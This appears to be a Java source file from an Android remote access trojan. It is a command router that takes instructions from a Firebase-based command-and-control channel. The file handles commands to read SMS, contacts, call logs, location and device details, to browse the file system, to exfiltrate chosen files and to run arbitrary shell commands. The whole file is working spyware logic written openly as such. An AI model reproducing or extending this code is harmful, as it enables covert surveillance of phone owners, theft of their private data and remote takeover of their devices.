package com.ratio.ratapp;

import android.content.Context;

import com.google.firebase.database.DataSnapshot;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class CommandRouter {

    public static Map<String, Object> execute(Context ctx, DataSnapshot cmd) {
        String action = cmd.child("action").getValue(String.class);
        String arg = cmd.child("arg").getValue(String.class);

        Map<String, Object> result = new HashMap<>();
        result.put("action", action);
        result.put("device", C2Manager.getDeviceId(ctx));

        switch (action == null ? "" : action) {
            case "device_info":
                result.put("data", DeviceInfo.snapshot(ctx));
                break;

            case "location":
                result.put("data", FileHelper.getLocation(ctx));
                break;

            case "sms":
                result.put("data", SmsReader.read(ctx));
                break;

            case "contacts":
                result.put("data", ContactsReader.read(ctx));
                break;

            case "call_log":
                result.put("data", FileHelper.getCallLog(ctx));
                break;

            case "list_files": {
                List<Map<String, Object>> files = new ArrayList<>();
                File dir = new File(arg != null && !arg.isEmpty() ? arg : "/");
                File[] kids = dir.listFiles();
                if (kids != null) {
                    for (File f : kids) {
                        Map<String, Object> e = new HashMap<>();
                        e.put("name", f.getName());
                        e.put("isDir", f.isDirectory());
                        e.put("size", f.length());
                        files.add(e);
                    }
                } else {
                    result.put("error", "cannot list: " + dir.getAbsolutePath());
                }
                result.put("data", files);
                break;
            }

            case "download_file":
                if (arg != null && !arg.isEmpty()) {
                    C2Manager.exfilFile(ctx, arg);
                    result.put("status", "queued: " + arg);
                } else {
                    result.put("error", "no path given");
                }
                break;

            case "shell":
                result.put("data", ShellExecutor.run(arg));
                break;

            default:
                result.put("error", "unknown action: " + action);
        }
        return result;
    }
}
